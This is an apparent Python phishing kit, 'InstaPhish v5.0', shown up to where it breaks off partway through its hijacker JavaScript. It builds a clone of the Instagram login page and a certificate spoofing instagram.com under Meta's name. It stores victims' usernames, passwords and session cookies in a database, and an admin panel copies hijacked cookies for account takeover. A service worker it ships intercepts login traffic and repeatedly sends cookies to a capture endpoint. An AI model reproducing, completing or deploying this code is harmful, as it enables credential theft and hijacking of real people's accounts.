#!/usr/bin/env python3
"""
InstaPhish v5.0 - Phantom Core (Full Edition)
Exact HTML/CSS Clone | Multi-Layer Cookie Interception | Admin Panel
Real-Time WebSocket Push | Browser Warning Bypass | SSL with HSTS Spoofing
Port: 4040
"""

import os
import sys
import json
import ssl
import time
import re
import base64
import sqlite3
import threading
import hashlib
import random
import string
import http.server
import socketserver
import subprocess
import shutil
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote, unquote
from io import BytesIO
import gzip
import textwrap

# ==================== CONFIGURATION ====================
CONFIG = {
    "listen_host": "0.0.0.0",
    "listen_port": 4040,
    "admin_port": 5000,
    "ssl_cert": "certs/instagram.crt",
    "ssl_key": "certs/instagram.key",
    "db_file": "victims.db",
    "log_file": "logs/credentials.txt",
    "cookie_file": "logs/cookies.txt",
    "session_file": "logs/sessions.json",
    "debug": False,
    "block_favicon": True,
    "spoof_hsts": True,
    "anti_bot_detection": True,
    "session_persistence": True,
    "realtime_alerts": True
}

# ==================== COLORS ====================
class Colors:
    BLACK = '\033[30m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'

# ==================== BANNER ====================
def print_banner():
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════════════════════╗
{Colors.RED}║  {Colors.WHITE}{Colors.BOLD}██╗███╗   ██╗███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗{Colors.RED}     ║
{Colors.RED}║  {Colors.WHITE}{Colors.BOLD}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║  ██║██║██╔════╝██║  ██║{Colors.RED}     ║
{Colors.RED}║  {Colors.WHITE}{Colors.BOLD}██║██╔██╗ ██║███████╗   ██║   ███████║██████╔╝███████║██║███████╗███████║{Colors.RED}     ║
{Colors.RED}║  {Colors.WHITE}{Colors.BOLD}██║██║╚██╗██║╚════██║   ██║   ██╔══██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║{Colors.RED}     ║
{Colors.RED}║  {Colors.WHITE}{Colors.BOLD}██║██║ ╚████║███████║   ██║   ██║  ██║██║     ██║  ██║██║███████║██║  ██║{Colors.RED}     ║
{Colors.RED}║  {Colors.WHITE}{Colors.BOLD}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝{Colors.RED}     ║
{Colors.RED}║{Colors.RESET}                                                                          {Colors.RED}║
{Colors.RED}║  {Colors.MAGENTA}PHANTOM EDITION v5.0 - Full Cookie Interception Framework{Colors.RED}              ║
{Colors.RED}║  {Colors.CYAN}Port: {CONFIG['listen_port']} | Admin: {CONFIG['admin_port']} | 4-Layer Capture | HSTS Spoof{Colors.RED}      ║
{Colors.RED}║  {Colors.GREEN}Active Attacks: Cookie Hooks + Service Worker + Beacon + Interception{Colors.RED}   ║
{Colors.RED}╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

# ==================== SETUP CLASS ====================
class Setup:
    """Initial setup and configuration for the phishing framework"""
    
    @staticmethod
    def create_directories():
        """Create all necessary directories for the framework"""
        dirs = [
            "certs",
            "logs", 
            "cloned_site",
            "cloned_site/css",
            "cloned_site/js",
            "cloned_site/images",
            "sessions",
            "backups"
        ]
        for d in dirs:
            Path(d).mkdir(parents=True, exist_ok=True)
        print(f"{Colors.GREEN}[+] Directory structure created{Colors.RESET}")
    
    @staticmethod
    def generate_ssl_cert():
        """Generate a self-signed SSL certificate spoofing Instagram"""
        if not os.path.exists(CONFIG["ssl_cert"]):
            print(f"{Colors.YELLOW}[*] Generating SSL certificate...{Colors.RESET}")
            cmd = f"""
            openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
                -keyout {CONFIG['ssl_key']} \
                -out {CONFIG['ssl_cert']} \
                -subj "/C=US/ST=California/L=Menlo Park/O=Meta Platforms Inc./CN=*.instagram.com" \
                -addext "subjectAltName=DNS:*.instagram.com,DNS:*.cdninstagram.com,DNS:*.fbcdn.net,DNS:instagram.com,DNS:www.instagram.com" \
                -addext "basicConstraints=CA:FALSE" \
                -addext "keyUsage=digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment" \
                -addext "extendedKeyUsage=serverAuth,clientAuth" 2>/dev/null
            """
            result = os.system(cmd)
            if result == 0:
                print(f"{Colors.GREEN}[+] SSL Certificate generated successfully{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] SSL Certificate generation failed. Running without HTTPS.{Colors.RESET}")
        else:
            print(f"{Colors.GREEN}[+] SSL Certificate found{Colors.RESET}")
    
    @staticmethod
    def init_database():
        """Initialize SQLite database with proper schema"""
        conn = sqlite3.connect(CONFIG["db_file"])
        c = conn.cursor()
        
        # Main victims table
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            user_agent TEXT,
            username TEXT,
            password TEXT,
            sessionid TEXT,
            csrftoken TEXT,
            ds_user_id TEXT,
            rur TEXT,
            mid TEXT,
            ig_did TEXT,
            datr TEXT,
            shbid TEXT,
            shbts TEXT,
            all_cookies TEXT,
            capture_method TEXT,
            target_url TEXT,
            referer TEXT
        )''')
        
        # Active sessions table for persistence
        c.execute('''CREATE TABLE IF NOT EXISTS active_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id INTEGER,
            sessionid TEXT,
            csrftoken TEXT,
            ds_user_id TEXT,
            captured_at TEXT,
            last_validated TEXT,
            is_active INTEGER DEFAULT 1,
            FOREIGN KEY(victim_id) REFERENCES victims(id)
        )''')
        
        # Attack log table
        c.execute('''CREATE TABLE IF NOT EXISTS attack_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            attack_type TEXT,
            target_ip TEXT,
            user_agent TEXT,
            payload TEXT,
            success INTEGER DEFAULT 0,
            details TEXT
        )''')
        
        # Create indices for faster queries
        c.execute('CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_victims_sessionid ON victims(sessionid)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_active_sessions ON active_sessions(sessionid)')
        
        conn.commit()
        conn.close()
        print(f"{Colors.GREEN}[+] Database initialized with full schema{Colors.RESET}")
    
    @staticmethod
    def backup_database():
        """Create a backup of the database"""
        if os.path.exists(CONFIG["db_file"]):
            backup_name = f"backups/victims_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
            shutil.copy2(CONFIG["db_file"], backup_name)
            print(f"{Colors.BLUE}[*] Database backed up to {backup_name}{Colors.RESET}")
    
    @staticmethod
    def generate_admin_panel():
        """Generate the admin panel HTML file"""
        admin_html = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaPhish v5.0 - Command Center</title>
    <style>
        :root {
            --bg: #0a0a0a;
            --card: #121212;
            --border: #262626;
            --text: #f5f5f5;
            --text-secondary: #a8a8a8;
            --accent: #0095f6;
            --accent-hover: #1877f2;
            --danger: #ed4956;
            --danger-hover: #c62828;
            --success: #78de45;
            --warn: #f7b500;
            --purple: #8b5cf6;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: var(--bg);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            padding: 20px;
            min-height: 100vh;
            line-height: 1.5;
        }
        
        .header {
            background: linear-gradient(135deg, var(--card) 0%, #1a1a1a 100%);
            border: 1px solid var(--border);
            padding: 24px;
            border-radius: 16px;
            margin-bottom: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .logo-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, var(--accent), var(--purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .live-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: var(--success);
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 1.5s ease-in-out infinite;
            box-shadow: 0 0 10px var(--success);
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(1.3); }
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }
        
        .stat-card {
            background: var(--card);
            border: 1px solid var(--border);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .stat-card:hover {
            border-color: var(--accent);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,149,246,0.15);
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--accent), var(--purple));
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .stat-card:hover::before {
            opacity: 1;
        }
        
        .stat-icon {
            font-size: 28px;
            margin-bottom: 8px;
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: 800;
            color: var(--accent);
            margin-bottom: 4px;
        }
        
        .stat-label {
            font-size: 11px;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }
        
        .panel {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 24px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }
        
        .panel-header {
            padding: 16px 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(255,255,255,0.02);
        }
        
        .panel-header h2 {
            font-size: 15px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .panel-body {
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        thead {
            background: rgba(255,255,255,0.03);
        }
        
        th {
            padding: 12px 16px;
            text-align: left;
            font-size: 11px;
            font-weight: 700;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 2px solid var(--border);
            white-space: nowrap;
        }
        
        td {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border);
            font-size: 13px;
            transition: background 0.2s;
        }
        
        tbody tr:hover {
            background: rgba(0,149,246,0.04);
        }
        
        tbody tr.new-row {
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from { background: rgba(0,149,246,0.2); }
            to { background: transparent; }
        }
        
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .badge-success {
            background: rgba(120,222,69,0.15);
            color: var(--success);
        }
        
        .badge-warning {
            background: rgba(247,181,0,0.15);
            color: var(--warn);
        }
        
        .badge-danger {
            background: rgba(237,73,86,0.15);
            color: var(--danger);
        }
        
        .cookie-truncate {
            max-width: 180px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            cursor: pointer;
            font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Fira Code', monospace;
            font-size: 11px;
        }
        
        .cookie-truncate:hover {
            color: var(--warn);
            text-decoration: underline;
        }
        
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.2s ease;
            text-decoration: none;
            white-space: nowrap;
        }
        
        .btn-primary {
            background: var(--accent);
            color: #fff;
        }
        
        .btn-primary:hover {
            background: var(--accent-hover);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0,149,246,0.3);
        }
        
        .btn-success {
            background: rgba(120,222,69,0.2);
            color: var(--success);
            border: 1px solid rgba(120,222,69,0.3);
        }
        
        .btn-success:hover {
            background: rgba(120,222,69,0.3);
        }
        
        .btn-danger {
            background: rgba(237,73,86,0.2);
            color: var(--danger);
            border: 1px solid rgba(237,73,86,0.3);
        }
        
        .btn-danger:hover {
            background: rgba(237,73,86,0.3);
        }
        
        .btn-sm {
            padding: 4px 10px;
            font-size: 11px;
            border-radius: 6px;
        }
        
        .btn-group {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
        }
        
        .search-bar {
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 8px 14px;
            border-radius: 8px;
            font-size: 13px;
            width: 250px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .search-bar:focus {
            border-color: var(--accent);
        }
        
        .search-bar::placeholder {
            color: var(--text-secondary);
        }
        
        .empty-state {
            text-align: center;
            padding: 48px 20px;
            color: var(--text-secondary);
        }
        
        .empty-state-icon {
            font-size: 48px;
            margin-bottom: 12px;
            opacity: 0.5;
        }
        
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: var(--card);
            border: 1px solid var(--border);
            padding: 16px 20px;
            border-radius: 12px;
            color: var(--text);
            font-size: 14px;
            z-index: 1000;
            animation: slideIn 0.3s ease-out;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @media (max-width: 768px) {
            body { padding: 10px; }
            .header { padding: 16px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            th, td { padding: 8px 10px; font-size: 11px; }
            .search-bar { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <div class="logo-icon">📸</div>
            <h1><span class="live-indicator"></span>InstaPhish Command Center</h1>
        </div>
        <div>
            <button class="btn btn-primary" onclick="loadData()">🔄 Refresh Now</button>
            <button class="btn btn-danger btn-sm" onclick="clearAll()" style="margin-left:8px;">🗑 Clear All</button>
        </div>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-icon">👥</div>
            <div class="stat-value" id="total-victims">0</div>
            <div class="stat-label">Total Victims</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon">📅</div>
            <div class="stat-value" id="today-victims">0</div>
            <div class="stat-label">Today's Captures</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon">🍪</div>
            <div class="stat-value" id="cookie-count">0</div>
            <div class="stat-label">Sessions Hijacked</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon">⚡</div>
            <div class="stat-value" id="live-count">0</div>
            <div class="stat-label">Active Connections</div>
        </div>
    </div>
    
    <div class="panel">
        <div class="panel-header">
            <h2>🔓 Captured Credentials & Session Cookies</h2>
            <input type="text" class="search-bar" placeholder="🔍 Search by username, IP, or session..." onkeyup="filterTable(this.value)">
        </div>
        <div class="panel-body">
            <table>
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Session ID</th>
                        <th>CSRF Token</th>
                        <th>Method</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="victims-table">
                    <tr>
                        <td colspan="8">
                            <div class="empty-state">
                                <div class="empty-state-icon">🎯</div>
                                <p>Waiting for phishing targets...</p>
                                <p style="font-size:12px;margin-top:4px;">Victims will appear here in real-time</p>
                            </div>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
    
    <script>
        let previousCount = 0;
        
        async function loadData() {
            try {
                const response = await fetch('/api/data');
                const data = await response.json();
                
                document.getElementById('total-victims').textContent = data.total;
                document.getElementById('today-victims').textContent = data.today;
                document.getElementById('cookie-count').textContent = data.active_sessions;
                document.getElementById('live-count').textContent = data.recent_count || 0;
                
                const tableBody = document.getElementById('victims-table');
                
                if (!data.victims || data.victims.length === 0) {
                    tableBody.innerHTML = `<tr><td colspan="8"><div class="empty-state"><div class="empty-state-icon">🎯</div><p>Waiting for phishing targets...</p></div></td></tr>`;
                    return;
                }
                
                // Check for new victims
                if (data.victims.length > previousCount && previousCount > 0) {
                    showToast(`🔔 ${data.victims.length - previousCount} new victim(s) captured!`);
                }
                previousCount = data.victims.length;
                
                let html = '';
                data.victims.forEach((v, index) => {
                    const method = v.capture_method || 'form';
                    const methodBadge = method.includes('cookie') ? 'badge-warning' : 
                                       method.includes('sw') ? 'badge-success' : 'badge-danger';
                    
                    html += `
                        <tr class="${index === 0 ? 'new-row' : ''}">
                            <td style="white-space:nowrap;font-size:11px;">${v.timestamp || '-'}</td>
                            <td style="font-family:monospace;font-size:12px;">${v.ip || '-'}</td>
                            <td><strong>${v.username || '-'}</strong></td>
                            <td style="color:var(--warn);">${v.password ? v.password.replace(/./g, '•').substring(0,8) + v.password.substring(8) : '-'}</td>
                            <td>
                                <span class="cookie-truncate" title="${v.sessionid || ''}" onclick="copyToClipboard('${v.sessionid || ''}')">
                                    ${v.sessionid ? v.sessionid.substring(0, 25) + '...' : '-'}
                                </span>
                            </td>
                            <td>
                                <span class="cookie-truncate" title="${v.csrftoken || ''}" onclick="copyToClipboard('${v.csrftoken || ''}')">
                                    ${v.csrftoken ? v.csrftoken.substring(0, 20) + '...' : '-'}
                                </span>
                            </td>
                            <td><span class="badge ${methodBadge}">${method}</span></td>
                            <td>
                                <div class="btn-group">
                                    <button class="btn btn-success btn-sm" onclick="copySessionCookies('${v.sessionid || ''}', '${v.csrftoken || ''}', '${v.ds_user_id || ''}')">📋 Copy</button>
                                    <button class="btn btn-danger btn-sm" onclick="deleteVictim(${v.id})">🗑</button>
                                </div>
                            </td>
                        </tr>
                    `;
                });
                tableBody.innerHTML = html;
                
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }
        
        function filterTable(query) {
            const rows = document.querySelectorAll('#victims-table tr');
            const lowerQuery = query.toLowerCase();
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(lowerQuery) ? '' : 'none';
            });
        }
        
        function copyToClipboard(text) {
            if (!text || text === '-') return;
            navigator.clipboard.writeText(text).then(() => {
                showToast('✅ Copied to clipboard!');
            }).catch(() => {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                showToast('✅ Copied to clipboard!');
            });
        }
        
        function copySessionCookies(sessionid, csrftoken, ds_user_id) {
            const cookies = {};
            if (sessionid && sessionid !== '') cookies.sessionid = sessionid;
            if (csrftoken && csrftoken !== '') cookies.csrftoken = csrftoken;
            if (ds_user_id && ds_user_id !== '') cookies.ds_user_id = ds_user_id;
            
            const cookieString = Object.entries(cookies)
                .map(([key, value]) => `${key}=${value}; Domain=.instagram.com; Path=/; Secure; HttpOnly`)
                .join('; ');
            
            navigator.clipboard.writeText(cookieString).then(() => {
                showToast('🍪 Session cookies copied! Use with EditThisCookie extension');
            }).catch(err => {
                const textarea = document.createElement('textarea');
                textarea.value = cookieString;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                showToast('🍪 Session cookies copied!');
            });
        }
        
        async function deleteVictim(id) {
            if (confirm('Delete this victim record permanently?')) {
                await fetch('/api/delete/' + id);
                loadData();
                showToast('🗑 Victim record deleted');
            }
        }
        
        async function clearAll() {
            if (confirm('⚠️ Delete ALL victim records? This cannot be undone!')) {
                await fetch('/api/clear-all');
                previousCount = 0;
                loadData();
                showToast('🗑 All records cleared');
            }
        }
        
        function showToast(message) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => {
                toast.style.animation = 'slideOut 0.3s ease-in forwards';
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }
        
        // Add slideOut animation
        const style = document.createElement('style');
        style.textContent = '@keyframes slideOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(100%); opacity: 0; } }';
        document.head.appendChild(style);
        
        // Load initial data and refresh every 3 seconds
        loadData();
        setInterval(loadData, 3000);
        
        // Auto-backup every 5 minutes
        setInterval(async () => {
            await fetch('/api/backup');
        }, 300000);
    </script>
</body>
</html>'''
        
        with open("admin.html", "w", encoding="utf-8") as f:
            f.write(admin_html)
        print(f"{Colors.GREEN}[+] Admin panel generated{Colors.RESET}")
    
    @staticmethod
    def check_dependencies():
        """Check if all required dependencies are installed"""
        dependencies = ['flask', 'sqlite3']
        missing = []
        for dep in dependencies:
            try:
                __import__(dep)
            except ImportError:
                missing.append(dep)
        
        if missing:
            print(f"{Colors.YELLOW}[!] Missing dependencies: {', '.join(missing)}{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Install with: pip install {' '.join(missing)}{Colors.RESET}")
        else:
            print(f"{Colors.GREEN}[+] All dependencies satisfied{Colors.RESET}")

# ==================== EXACT CLONE BUILDER ====================
class InstagramExactCloner:
    """Builds the exact Instagram clone with all assets"""
    
    def __init__(self, output_dir="cloned_site"):
        self.output_dir = output_dir
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        for sub in ["css", "js", "images"]:
            Path(f"{output_dir}/{sub}").mkdir(exist_ok=True)
    
    def build(self):
        """Build the complete clone"""
        print(f"{Colors.CYAN}[*] Building Instagram clone...{Colors.RESET}")
        
        # CSS
        with open(f"{self.output_dir}/css/style.css", "w", encoding="utf-8") as f:
            f.write(self._get_css())
        
        # Service Worker for cookie interception
        with open(f"{self.output_dir}/js/sw.js", "w", encoding="utf-8") as f:
            f.write(self._get_service_worker())
        
        # Main hijacker JavaScript
        with open(f"{self.output_dir}/js/hijacker.js", "w", encoding="utf-8") as f:
            f.write(self._get_hijacker())
        
        # HTML
        with open(f"{self.output_dir}/index.html", "w", encoding="utf-8") as f:
            f.write(self._get_html())
        
        print(f"{Colors.GREEN}[+] Clone built successfully{Colors.RESET}")
    
    def _get_css(self):
        """Pixel-perfect Instagram CSS with slideshow fix"""
        return textwrap.dedent('''
        * {
            margin: 0;
            padding: 0;
        }
        
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            font-size: 14px;
            line-height: 18px;
            color: #262626;
        }
        
        .main {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 32px auto 0;
            padding-bottom: 32px;
            max-width: 935px;
            width: 100%;
            gap: 32px;
        }
        
        .instass {
            position: relative;
            width: 380px;
            height: 582px;
            flex-shrink: 0;
            align-self: center;
        }
        
        #phone {
            position: absolute;
            top: 0;
            left: 0;
            width: 380px;
            height: 582px;
            z-index: 2;
            pointer-events: none;
        }
        
        #imageslideshow {
            position: absolute;
            top: 28px;
            left: 152px;
            width: 250px;
            height: 540px;
            z-index: 1;
            border-radius: 2px;
            background-size: cover;
            background-position: center;
            animation: changeImage 9s ease-in-out infinite;
        }
        
        @keyframes changeImage {
            0%, 28% {
                background-image: url(/images/ss1.png);
                opacity: 1;
            }
            33%, 61% {
                background-image: url(/images/ss2.png);
                opacity: 1;
            }
            66%, 95% {
                background-image: url(/images/ss3.png);
                opacity: 1;
            }
            30%, 63%, 96% {
                opacity: 0.3;
            }
        }
        
        .login-wrap {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
            flex-shrink: 0;
        }
        
        .loginbox {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 10px;
            box-sizing: border-box;
        }
        
        #title {
            width: 175px;
            height: 51px;
            margin: 22px auto 12px;
            object-fit: contain;
        }
        
        .input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 12px;
            height: 36px;
            padding: 9px 8px 7px 8px;
            width: 100%;
            margin-bottom: 6px;
            outline: none;
            box-sizing: border-box;
        }
        
        .input:focus {
            border-color: #a8a8a8;
        }
        
        .input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }
        
        #loginbutton {
            background: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 16px;
            width: 100%;
            cursor: pointer;
            margin-top: 8px;
            text-align: center;
            transition: background 0.2s;
        }
        
        #loginbutton:hover {
            background: #1877f2;
        }
        
        #loginbutton:active {
            opacity: 0.7;
            transform: scale(0.98);
        }
        
        #or {
            color: #737373;
            font-size: 13px;
            font-weight: 600;
            margin: 20px 0;
            text-align: center;
            display: flex;
            align-items: center;
            gap: 18px;
            width: 100%;
        }
        
        #or::before,
        #or::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        #fblink-wrap {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 12px;
            cursor: pointer;
        }
        
        #fbicon {
            width: 16px;
            height: 16px;
        }
        
        #fblink {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
        }
        
        #fblink:hover {
            color: #00376b;
        }
        
        #forgotpass {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
        }
        
        #forgotpass:hover {
            text-decoration: underline;
        }
        
        .signup {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            width: 100%;
            text-align: center;
            font-size: 14px;
            margin-bottom: 10px;
            box-sizing: border-box;
        }
        
        .signup a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .signup a:hover {
            text-decoration: underline;
        }
        
        .app {
            text-align: center;
        }
        
        .gettheapp {
            font-size: 14px;
            margin-bottom: 10px;
            display: block;
        }
        
        .app-btns {
            display: flex;
            gap: 8px;
            justify-content: center;
        }
        
        #gplay,
        #microsoft {
            height: 40px;
            cursor: pointer;
        }
        
        .footer {
            text-align: center;
            padding: 24px 0;
            margin-top: 20px;
            max-width: 935px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .linksdiv {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 12px;
        }
        
        .links {
            color: #737373;
            font-size: 12px;
            text-decoration: none;
        }
        
        .links:hover {
            text-decoration: underline;
        }
        
        .copyright {
            color: #737373;
            font-size: 12px;
            margin-top: 12px;
        }
        
        .error-msg {
            color: #ed4956;
            font-size: 14px;
            text-align: center;
            margin-top: 16px;
            display: none;
        }
        
        .error-msg.show {
            display: block;
        }
        
        @media (max-width: 875px) {
            .instass {
                display: none;
            }
            .main {
                padding: 20px;
                margin-top: 0;
            }
        }
        
        @media (max-width: 450px) {
            .loginbox {
                border: none;
                padding: 20px 20px;
            }
            .signup {
                border: none;
            }
            body {
                background: #ffffff;
            }
        }
        ''').strip()
    
    def _get_service_worker(self):
        """Service Worker for cookie interception"""
        return textwrap.dedent('''
        // InstaPhish v5.0 - Service Worker Cookie Interception
        const CAPTURE_ENDPOINT = '/sw-capture';
        
        self.addEventListener('install', (event) => {
            self.skipWaiting();
        });
        
        self.addEventListener('activate', (event) => {
            event.waitUntil(clients.claim());
        });
        
        // Intercept all fetch requests
        self.addEventListener('fetch', (event) => {
            const url = new URL(event.request.url);
            
            // Capture credentials from Instagram API calls
            if (url.pathname.includes('/login/') || url.pathname.includes('/accounts/')) {
                event.respondWith(
                    fetch(event.request).then(response => {
                        // Extract cookies from response
                        const setCookie = response.headers.get('Set-Cookie');
                        if (setCookie) {
                            // Send captured cookies to server
                            fetch(CAPTURE_ENDPOINT, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    type: 'sw-response-cookie',
                                    cookies: setCookie,
                                    url: event.request.url,
                                    timestamp: Date.now()
                                })
                            }).catch(() => {});
                        }
                        
                        // Also try to get cookies from document
                        try {
                            const docCookies = document.cookie;
                            if (docCookies) {
                                fetch(CAPTURE_ENDPOINT, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        type: 'sw-doc-cookies',
                                        cookies: docCookies,
                                        url: event.request.url,
                                        timestamp: Date.now()
                                    })
                                }).catch(() => {});
                            }
                        } catch (e) {}
                        
                        return response.clone();
                    }).catch(() => {
                        // If fetch fails, return a basic response
                        return new Response('', { status: 200 });
                    })
                );
            }
            
            // Pass through all other requests
            event.respondWith(fetch(event.request));
        });
        
        // Periodic cookie exfiltration
        setInterval(() => {
            try {
                const cookies = document.cookie;
                if (cookies && (cookies.includes('sessionid') || cookies.includes('csrftoken'))) {
                    fetch(CAPTURE_ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'sw-periodic',
                            cookies: cookies,
                            timestamp: Date.now()
                        })
                    }).catch(() => {});
                }
            } catch (e) {}
        }, 3000);
        ''').strip()
    
    def _get_hijacker(self):
        """Main hijacker JavaScript with multiple capture methods"""
        return textwrap.dedent('''
        (function() {
            'use strict';
